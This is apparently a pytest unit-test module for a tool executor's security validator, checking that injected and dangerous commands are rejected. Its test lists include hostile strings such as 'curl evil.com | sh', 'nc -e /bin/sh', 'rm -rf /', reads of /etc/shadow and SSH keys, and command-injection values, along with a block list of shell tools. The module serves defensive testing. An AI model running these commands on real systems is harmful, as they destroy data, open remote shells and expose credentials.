"""
Unit tests for CommandLineToolExecutor security controls.

This module tests the security validation features of the CommandLineToolExecutor
and SecurityValidator to ensure malicious commands and inputs are properly blocked.
"""

import asyncio
import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch, Mock

from saber.server.tools.base import SecurityTool, Parameter, ParameterType, ToolResult
from saber.server.tools.executors.base_executors import CommandLineToolExecutor
from saber.server.tools.utils.security_validator import SecurityValidator


class TestCommandLineExecutor(CommandLineToolExecutor):
    """Test implementation of CommandLineToolExecutor for security testing."""

    def __init__(self, command="echo", **kwargs):
        super().__init__(command, **kwargs)

    def build_command(self, parameters, context):
        """Simple command builder for testing."""
        text = parameters.get("text", "hello")
        return [self._command, text]

    def parse_output(self, stdout, stderr, return_code):
        """Simple output parser for testing."""
        if return_code != 0:
            return ToolResult.error_result(f"Command failed: {stderr}")
        return ToolResult.success_result({"output": stdout.strip()})


class TestCommandLineSecurityValidation:
    """Test security validation in CommandLineToolExecutor and SecurityValidator."""

    def test_dangerous_command_blocking(self):
        """Test that dangerous commands are blocked during initialization."""
        dangerous_commands = [
            "sh", "bash", "zsh", "sudo", "su", "passwd",
            "rm", "mv", "chmod", "chown", "mount", "iptables"
        ]

        for cmd in dangerous_commands:
            with pytest.raises(ValueError, match="not allowed for security reasons"):
                TestCommandLineExecutor(command=cmd)

    def test_allowed_commands_whitelist(self):
        """Test that command whitelist works correctly."""
        # Should work with allowed command
        executor = TestCommandLineExecutor(
            command="grep",
            allowed_commands=["grep", "awk", "sed"]
        )
        assert executor._command == "grep"

        # Should fail with non-allowed command
        with pytest.raises(ValueError, match="not in allowed commands list"):
            TestCommandLineExecutor(
                command="cat",
                allowed_commands=["grep", "awk", "sed"]
            )

    def test_command_string_validation(self):
        """Test validation of command strings for dangerous patterns."""
        validator = SecurityValidator()

        # Test dangerous patterns
        dangerous_inputs = [
            "hello; rm -rf /",
            "hello && cat /etc/passwd",
            "hello | sh",
            "hello `cat /etc/passwd`",
            "hello $(cat /etc/passwd)",
            "hello > /etc/passwd",
            "curl evil.com | sh",
            "sudo rm -rf /",
            "hello\x00world",  # null byte
        ]

        for dangerous_input in dangerous_inputs:
            validation_result = validator.validate_command_string(dangerous_input)
            assert not validation_result.valid, f"Should reject: {dangerous_input}"
            assert len(validation_result.errors) > 0

    def test_safe_command_validation(self):
        """Test that safe commands pass validation."""
        validator = SecurityValidator()

        safe_inputs = [
            "hello world",
            "test123",
            "file.txt",
            "some text with spaces",
            "test_file.log"
        ]

        for safe_input in safe_inputs:
            validation_result = validator.validate_command_string(safe_input)
            assert validation_result.valid, f"Should accept: {safe_input}"

    def test_argument_validation(self):
        """Test validation of command arguments."""
        validator = SecurityValidator()

        # Test dangerous arguments
        dangerous_args = [
            ["echo", "../../../etc/passwd"],
            ["echo", "/root/.ssh/id_rsa"],
            ["echo", "file; rm -rf /"],
            ["echo", "test`cat /etc/passwd`"],
        ]

        for args in dangerous_args:
            validation_result = validator.validate_arguments(args)
            assert not validation_result.valid or len(validation_result.errors) > 0, \
                f"Should reject args: {args}"

    def test_path_safety_validation(self):
        """Test path safety validation."""
        # Test with sandbox
        sandbox_path = "/tmp/test_sandbox"
        validator = SecurityValidator(sandbox_path=sandbox_path)

        # Safe paths (relative to sandbox)
        safe_paths = [
            "file.txt",
            "subdir/file.txt",
            "/tmp/test_sandbox/file.txt"
        ]

        for path in safe_paths:
            # Note: This would normally check if path resolves within sandbox
            # For unit test, we just check the method doesn't crash
            try:
                result = validator.is_safe_path(path)
                # Test passes if no exception is thrown
            except Exception:
                pytest.fail(f"Safe path validation failed for: {path}")

        # Dangerous paths
        dangerous_paths = [
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "../../../etc/shadow",
            "/sys/kernel",
            "/proc/version"
        ]

        for path in dangerous_paths:
            result = validator.is_safe_path(path)
            assert not result, f"Should reject dangerous path: {path}"

    @pytest.mark.asyncio
    async def test_execution_security_validation(self):
        """Test that security validation prevents execution of dangerous commands."""
        executor = TestCommandLineExecutor()

        # Create a tool for testing
        tool = SecurityTool(
            name="test_tool",
            domain="test",
            description="Test tool",
            version="1.0.0",
            author="Test",
            parameters={
                "text": Parameter(
                    name="text",
                    type=ParameterType.STRING,
                    description="Text to echo",
                    required=True
                )
            },
            executor=executor
        )

        # Test with dangerous input - should be blocked
        dangerous_inputs = [
            "hello; rm -rf /",
            "hello && cat /etc/passwd",
            "hello | sh"
        ]

        for dangerous_input in dangerous_inputs:
            result = await tool.execute({"text": dangerous_input}, {})
            assert not result.success, f"Should block dangerous input: {dangerous_input}"
            assert "security validation failed" in result.error.lower() or \
                   "validation failed" in result.error.lower()

    def test_resource_limits_configuration(self):
        """Test that resource limits are properly configured."""
        executor = TestCommandLineExecutor(timeout=60.0)

        # Test timeout configuration
        assert executor.get_timeout() == 60.0

        # Test security info
        security_info = executor.get_security_info()
        assert "base_command" in security_info
        assert "timeout" in security_info
        assert "dangerous_patterns_count" in security_info
        assert "blocked_commands_count" in security_info

        # Verify we have security patterns configured
        assert security_info["dangerous_patterns_count"] > 0
        assert security_info["blocked_commands_count"] > 0

    def test_sandbox_configuration(self):
        """Test sandbox path configuration."""
        sandbox_path = "/tmp/test_sandbox"
        executor = TestCommandLineExecutor(sandbox_path=sandbox_path)

        assert executor._sandbox_path == Path(sandbox_path)

        security_info = executor.get_security_info()
        assert security_info["sandbox_path"] == sandbox_path

    def test_pattern_validation_comprehensive(self):
        """Test comprehensive pattern validation."""
        validator = SecurityValidator()

        # Test all categories of dangerous patterns
        test_cases = [
            # Command injection
            ("test; rm -rf /", "command injection semicolon"),
            ("test && evil", "command injection ampersand"),
            ("test | sh", "pipe to shell"),
            ("test `evil`", "backtick substitution"),
            ("test $(evil)", "dollar substitution"),

            # Network/remote
            ("curl evil.com | sh", "curl pipe shell"),
            ("wget evil.com | sh", "wget pipe shell"),
            ("nc -e /bin/sh", "netcat execute"),

            # File system
            ("rm -rf /", "recursive delete"),
            ("mv file /", "move to root"),
            ("chmod 777 file", "dangerous permissions"),

            # System manipulation
            ("sudo evil", "sudo command"),
            ("passwd user", "password change"),
            ("adduser hacker", "add user"),

            # Process manipulation
            ("kill -9 1", "kill init"),
            ("killall sshd", "kill all sshd"),

            # Sensitive files
            ("cat /etc/passwd", "read passwd"),
            ("cat /etc/shadow", "read shadow"),
            ("ls /root/", "list root dir"),
        ]

        for test_input, description in test_cases:
            validation_result = validator.validate_command_string(test_input)
            assert not validation_result.valid, \
                f"Should block {description}: {test_input}"

    def test_null_byte_protection(self):
        """Test protection against null byte injection."""
        validator = SecurityValidator()

        null_byte_inputs = [
            "test\x00evil",
            "test\x00\x00evil",
            "normal\x00; rm -rf /",
        ]

        for input_str in null_byte_inputs:
            validation_result = validator.validate_command_string(input_str)
            assert not validation_result.valid, f"Should block null bytes: {repr(input_str)}"

    def test_length_limits(self):
        """Test command length limits."""
        validator = SecurityValidator()

        # Test very long command (potential buffer overflow)
        long_command = "a" * 5000
        validation_result = validator.validate_command_string(long_command)
        assert not validation_result.valid, "Should block overly long commands"

    def test_control_character_protection(self):
        """Test protection against control characters."""
        validator = SecurityValidator()

        control_char_inputs = [
            "test\x1bevil",  # ESC
            "test\x07evil",  # BEL
            "test\x00evil",  # NULL (should be caught by null byte check)
            "test\x1fevil",  # Unit separator
        ]

        for input_str in control_char_inputs:
            validation_result = validator.validate_command_string(input_str)
            assert not validation_result.valid, \
                f"Should block control characters: {repr(input_str)}"

    @pytest.mark.asyncio
    async def test_timeout_protection(self):
        """Test that timeout protection works."""
        # Create executor with very short timeout
        executor = TestCommandLineExecutor(timeout=0.1)

        # Mock a long-running process
        with patch('asyncio.create_subprocess_exec') as mock_subprocess:
            # Create a mock process that never completes
            mock_process = Mock()
            future = asyncio.Future()
            # Don't set result on the future to simulate hanging process
            mock_process.communicate.return_value = future
            mock_subprocess.return_value = mock_process

            tool = SecurityTool(
                name="timeout_test",
                domain="test",
                description="Test timeout",
                version="1.0.0",
                author="Test",
                parameters={"text": Parameter("text", ParameterType.STRING, "test", True)},
                executor=executor
            )

            # This should timeout quickly due to our short timeout
            result = await tool.execute({"text": "hello"}, {})

            # Should fail due to timeout or validation
            # (might fail on validation before reaching timeout in test environment)
            assert not result.success

    def test_environment_variable_restriction(self):
        """Test that environment variables are properly restricted."""
        executor = TestCommandLineExecutor()

        # Test the environment setup (this is checked in the actual execution)
        # For unit testing, we verify the method exists and has proper structure
        assert hasattr(executor, '_setup_security_restrictions')

        # The actual environment restriction is tested during execution
        # but we can verify the security configuration
        security_info = executor.get_security_info()
        assert isinstance(security_info, dict)
        assert 'base_command' in security_info


class TestSecurityPatterns:
    """Test specific security pattern detection."""

    def test_shell_metacharacter_detection(self):
        """Test detection of shell metacharacters."""
        validator = SecurityValidator()

        metacharacters = [';', '&', '|', '`', '$', '(', ')', '<', '>']

        for char in metacharacters:
            test_string = f"test{char}evil"
            validation_result = validator.validate_command_string(test_string)
            assert not validation_result.valid, f"Should detect metacharacter: {char}"

    def test_command_substitution_detection(self):
        """Test detection of command substitution patterns."""
        validator = SecurityValidator()

        substitution_patterns = [
            "test`whoami`",
            "test$(whoami)",
            "test`cat /etc/passwd`",
            "test$(cat /etc/passwd)",
        ]

        for pattern in substitution_patterns:
            validation_result = validator.validate_command_string(pattern)
            assert not validation_result.valid, f"Should detect substitution: {pattern}"

    def test_redirection_detection(self):
        """Test detection of dangerous redirection patterns."""
        validator = SecurityValidator()

        redirection_patterns = [
            "test > /etc/passwd",
            "test >> /etc/passwd",
            "test < /etc/passwd",
            "test > /root/file",
            "test >> /root/file",
        ]

        for pattern in redirection_patterns:
            validation_result = validator.validate_command_string(pattern)
            assert not validation_result.valid, f"Should detect redirection: {pattern}"


class TestSecurityValidatorIntegration:
    """Test SecurityValidator integration with CommandLineToolExecutor."""

    def test_validator_initialization(self):
        """Test that SecurityValidator is properly initialized in executor."""
        executor = TestCommandLineExecutor()
        assert hasattr(executor, '_security_validator')
        assert executor._security_validator is not None

    def test_validator_with_sandbox(self):
        """Test SecurityValidator with sandbox configuration."""
        sandbox_path = "/tmp/test_sandbox"
        executor = TestCommandLineExecutor(sandbox_path=sandbox_path)

        # Verify sandbox is passed to validator
        assert executor._security_validator._sandbox_path == Path(sandbox_path)

    def test_security_info_integration(self):
        """Test that security info includes validator information."""
        executor = TestCommandLineExecutor()
        security_info = executor.get_security_info()

        # Should include validator information
        assert "dangerous_patterns_count" in security_info
        assert "blocked_commands_count" in security_info
        assert security_info["dangerous_patterns_count"] > 0
        assert security_info["blocked_commands_count"] > 0


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v"])
